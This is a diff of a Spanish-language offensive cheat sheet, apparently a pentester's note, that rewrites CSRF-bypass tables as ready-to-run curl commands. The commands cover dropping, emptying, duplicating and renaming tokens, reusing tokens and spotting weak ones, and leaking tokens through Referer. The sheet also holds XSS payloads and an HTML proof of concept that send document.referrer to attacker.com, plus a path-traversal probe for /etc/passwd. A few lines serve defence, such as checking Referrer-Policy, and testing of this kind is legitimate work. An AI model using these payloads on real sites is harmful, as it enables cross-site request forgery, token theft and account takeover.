@@ -20,103 +20,89 @@ linked:
 
 ## Token No Validado (Remove)
 
-|         **Objetivo**         |                                    **Probe**                                     |                      **Notas**                      |
-| :--------------------------: | :------------------------------------------------------------------------------: | :-------------------------------------------------: |
-| Eliminar token completamente |                          Submit sin field `csrf_token`                           | Backend que solo valida si presente → bypass total. |
-|     Eliminar header CSRF     |                             `X-CSRF-Token` removido                              |             Mismo concepto en headers.              |
-|         Empty token          |                           `csrf_token=` (string vacío)                           |            Algunos comparan con == laxo.            |
-|          Token NULL          |                                `csrf_token=null`                                 |               String literal "null".                |
-|       Token undefined        |                              Sin field en absoluto                               |                 Diferente de empty.                 |
-|    Header con valor vacío    |                                 `X-CSRF-Token: `                                 |       Trailing space — algunos parsers strip.       |
-|     Token con whitespace     |                                  `csrf_token= `                                  |                  Otros normalizan.                  |
-|       Múltiples fields       | `<input name="csrf_token" value="">` + `<input name="csrf_token" value="legit">` |            Server toma primero o último.            |
-|     Cookie sí, header no     |                      Si solo cookie tiene token, no header                       |           Double-submit con backend laxo.           |
-|        GET con params        |                     Convertir POST a GET con params del body                     |          Algunos endpoints aceptan ambos.           |
+| **Comando** | **Qué obtenés** | **Cuándo** |
+|:---:|:---:|:---:|
+| `curl -X POST -b "session=$COOKIE" https://target/action -d "k=v"` (sin csrf_token field) | Eliminar field por completo | Backend solo valida si presente. |
+| `curl -X POST -b "session=$COOKIE" https://target/action -d "csrf_token=&k=v"` | Token empty string | Comparación `==` lax permite empty. |
+| `curl -X POST -b "session=$COOKIE" https://target/action -d "csrf_token=null&k=v"` | Token literal "null" | String "null" tratada como valid. |
+| `curl -X POST -b "session=$COOKIE" -H "X-CSRF-Token:" https://target/action -d "k=v"` | Header empty | Header strip whitespace antes de comparar. |
+| `curl -X POST -b "session=$COOKIE" https://target/action -d "csrf_token=&csrf_token=$LEAK"` | Duplicate field — server toma uno u otro | Parser depende del language. |
+| Convertir POST a GET con query string: `curl -G "https://target/action" --data-urlencode "k=v" -b "session=$COOKIE"` | Endpoint acepta GET → no valida CSRF | Method-based bypass. |
+| `for h in 'X-CSRF-Token' 'X-CSRFToken' 'X-XSRF-Token' 'CSRF-Token' 'csrf-token'; do curl ... -H "$h:" ...; done` | Probe variantes de header empty | Multiple header naming. |
 ^csrf-bypass-token-remove
 
 ___
 
 ## Token Validado Solo Si Presente
 
-| **Objetivo** | **Probe** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| Test pattern | Backend solo valida token si campo `csrf_token` existe en body | Anti-pattern frecuente. |
-| Bypass via name change | Renombrar `csrf_token` a `csrftoken` o `_token` | Si validador hardcodea name exacto. |
-| Bypass via case | `CSRF_Token`, `Csrf_Token` | Header case-insensitive, body case-sensitive — varía. |
-| Bypass via array param | `csrf_token[]=valid` (array) | PHP / parsers laxos lo tratan distinto. |
-| Bypass via JSON object | `{"csrf_token":{"value":"..."}}` | Type confusion en parser. |
-| Bypass via duplicate | `csrf_token=garbage&csrf_token=` | Server toma uno u otro. |
-| Header en lugar de field | Cuando endpoint acepta ambos | Mover token a `X-CSRF-Token` legítimo + omitir field. |
-| Token presente con value invalid | `csrf_token=AAAAAAAA` | Solo valida presencia, no contenido. |
-| Token con prefijo/sufijo | `csrf_token=valid_token_+ extra` | String concat tolerado. |
-| Test sin contenido | `csrf_token=null` o `csrf_token=undefined` | Type juggling. |
+| `curl -X POST -d "csrf_token=AAAAAAAA&k=v"` | Token con valor inválido aceptado | Valida solo presencia, no contenido. |
+| `curl -X POST -d "csrf_token=valid_+ extra&k=v"` (con concat) | String concat tolerated | Validation usa contains o startsWith. |
+| `curl -X POST -d "csrftoken=$VALID&k=v"` (sin underscore) | Bypass via name change | Filter hardcodea nombre exacto. |
+| `curl -X POST -d "_token=$VALID&k=v"` | Naming variant Laravel/Symfony | Per-framework. |
+| `curl -X POST -H "Content-Type: application/json" -d '{"csrf_token":{"value":"x"},"k":"v"}'` | Type confusion (object en lugar de string) | Parser type-juggling. |
+| `curl -X POST -d "csrf_token[]=garbage&k=v"` | Array notation | PHP/parsers tratan array distinto. |
+| `curl -X POST -d "csrf_token=garbage&csrf_token=&k=v"` | Duplicate (legit + empty) | Server toma primer/último. |
+| `curl -X POST -H "X-CSRF-Token: valid" -d "csrf_token=garbage&k=v"` | Header válido + body garbage | Backend acepta cualquiera. |
 ^csrf-bypass-token-presence
 
 ___
 
 ## Token Reuse / Fixed Value
 
-| **Objetivo** | **Probe** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| Reutilizar token de sesión propia | Capturar token + usar en sesión víctima | Si token no tied to user. |
-| Token estático | Token igual entre sesiones | Anti-pattern severo. |
-| Token tied a IP solo | Cambiar IP → token inválido, mantener IP → siempre OK | Si attacker e victim misma IP. |
-| Token reutilizable indefinidamente | Sin expiration | Capture once, use forever. |
-| Login CSRF luego reuse | Login attacker → robar token → usar contra victim | Auth context. |
-| Token predecible | Counter / timestamp / uuid v1 | Predicción matemática. |
-| Token con MD5/SHA1 weak | Hash de cosa conocida | Reverse engineering. |
-| Token derivado de session ID | `token = sha256(session_id)` | Session leak → token leak. |
-| Default token "test" | Algunas apps tienen token "default" | Lookup en source / docs. |
-| Token in URL leakeado | `Referer` header → token a 3rd party | Logs externos. |
+| Capturar token de sesión atacante + usar en PoC contra víctima | Token compartido entre users (no session-bound) | Token global pool. |
+| `for s in session_a session_b session_c; do curl --cookie "session=$s" https://target/csrf ; done \| sort -u` | Detectar si token es estático | Same value across users = vuln. |
+| Capturar token semana pasada + replay hoy | Token sin TTL | Replay window infinito. |
+| Login con creds atacante → capture token → usar contra víctima desde mismo IP | Token tied to IP solo | Wi-Fi compartido / corp network. |
+| `for i in {1..100}; do curl ...; done \| jq .csrf_token \| sort -u` (analizar entropía) | Identificar pattern predecible | Counter/timestamp/UUIDv1. |
+| `python3 -c "import hashlib; print(hashlib.md5(b'$SESSION_ID').hexdigest())"` | Test si token = MD5(session_id) | Token derivation predictable. |
+| `grep -rE 'csrf.*=.*['\''\"][a-zA-Z0-9]{8,}['\''\"]' static/js/` | Hardcoded default token en JS | Disclosure de defaults. |
 ^csrf-bypass-token-reuse
 
 ___
 
 ## Token Tied to Non-Session
 
-| **Objetivo** | **Probe** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| Tied a IP sólo | Misma IP, distinto user → mismo token válido | Compartir Wi-Fi público. |
-| Tied a user-agent | Token válido si UA igual | Trivial replicar. |
-| Tied a User-ID estático | Token = function(user_id) sin session secret | Leak user_id → forge. |
-| Tied a timestamp redondeado | Token solo cambia cada hora | Window grande. |
-| Tied to nothing | Token random pero compartido entre users | Pool global. |
-| Login CSRF → ATO | Login con creds atacante → robar token → switch session víctima | Multi-step. |
-| Cookie de token detached | Cookie `csrf=...` no link a session cookie | Subdomain takeover steal. |
-| Token cifrado pero key leaked | Pública / hardcoded key en JS frontend | Forge desde cliente. |
-| HMAC con secret leaked | Secret en repo público | Universal forge. |
-| Backend valida solo origen del cliente vía cookie | Atacante con misma cookie cs root domain | Subdomain abuse. |
+| Capturar token desde misma IP atacante + víctima → usar en víctima session | Token tied a IP, no session | Compartir red. |
+| Replicar `User-Agent` exacto + capture token → reuse | Token tied a UA | UA-based binding. |
+| `python3 -c "import hashlib; print(hashlib.sha256(b'$USER_ID').hexdigest())"` | Token derivado de user_id sin secret | Leak user_id → forge. |
+| `t1=$(curl ... 2>&1); sleep 3600; t2=$(curl ...); diff <(echo $t1) <(echo $t2)` | Token rotated solo cada hora | Window grande replay. |
+| Login atacante → capture token → mid-session swap a víctima cookie | Login CSRF → ATO chain | Multi-step. |
+| Cookie `csrf=ABC` cross-subdomain (sin Domain restriction) | Combine con subdomain takeover | Cookie hijack via SDT. |
+| `grep -rE 'csrf.*secret.*=' src/` | HMAC secret hardcoded en repo público | Universal forge. |
 ^csrf-bypass-token-tied
 
 ___
 
 ## Token Leak (Referer / URL)
 
-| **Objetivo** | **Probe** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| Token en URL GET | `https://target/action?csrf=ABC123&...` | Logueado en server logs, browser history, Referer header. |
-| Leak via Referer cross-origin | Embed `<img src="http://attacker/log">` en página con token en URL → atacante recibe Referer | Vector clásico. |
-| Leak via window.location | JS hostil con `parent.location.search` | Iframe scenarios. |
-| Leak via 3rd-party script | Tag manager, analytics — script external recibe URL | Risk de supply chain. |
-| Token en HTML cacheado | Public CDN / proxy guarda response con token | Attacker reads cache. |
-| Token en comments JS | `// CSRF: ABC123` en código frontend | Source disclosure. |
-| Token en `<meta>` accesible | `<meta name="csrf-token" content="...">` | Cross-frame access via window.frames. |
-| Local storage / Session storage | `localStorage.getItem('csrf_token')` desde XSS | XSS chain. |
-| Token en error pages | 404 / 500 con token reflejado | Crawled. |
-| Token via XSS reflejado | XSS leak token al atacante | Combo. |
+| `<img src="https://attacker.com/log" id="img">` en página víctima → server atacante recibe Referer con URL completa | Token en URL leak via Referer cross-origin | Token en GET param. |
+| `curl -sI https://target/action?csrf=$T \| grep -i referrer-policy` | Verificar política Referrer | Defense check. |
+| `<iframe src="https://target/page?csrf=ABC"></iframe>` + `parent.frames[0].location` (XSS combo) | Cross-frame URL access | Same-origin frame. |
+| `<script>fetch('//attacker?'+document.referrer)</script>` | Auto-exfil del Referer | XSS combo. |
+| `grep -rE 'csrf[_-]token[^a-z]+["\x27][A-Za-z0-9]{20,}' static/js/` | Source disclosure de tokens | Tokens hardcoded en JS. |
+| Inspeccionar `localStorage.getItem('csrf_token')` desde XSS | localStorage exfil | XSS chain. |
+| `curl -s "https://target/error?path=../etc/passwd" \| grep csrf` | Token reflejado en error pages | Reflected token. |
+| `<meta name="csrf-token" content="...">` lectura via XSS | Meta tag exfil | XSS combo. |
 ^csrf-bypass-token-leak
 
 ### Referer leak PoC
 
 ```html
 <!-- Atacante hostea esto en attacker.com -->
-<!-- Victim visita https://target.com/transfer?csrf=ABC123 -->
-<!-- Cuando víctima ve esto, navegador manda Referer al atacante -->
+<!-- Víctima visita https://target.com/transfer?csrf=ABC123 -->
+<!-- Cuando víctima carga este HTML, navegador manda Referer al atacante -->
 <img src="https://attacker.com/log" id="img">
 <script>
   document.getElementById('img').onload = () => {
-    // Server logs reciben header: Referer: https://target.com/transfer?csrf=ABC123
-    fetch('/exfil?ref='+document.referrer);
+    fetch('https://attacker.com/exfil?ref='+document.referrer);
   };
 </script>
 ```
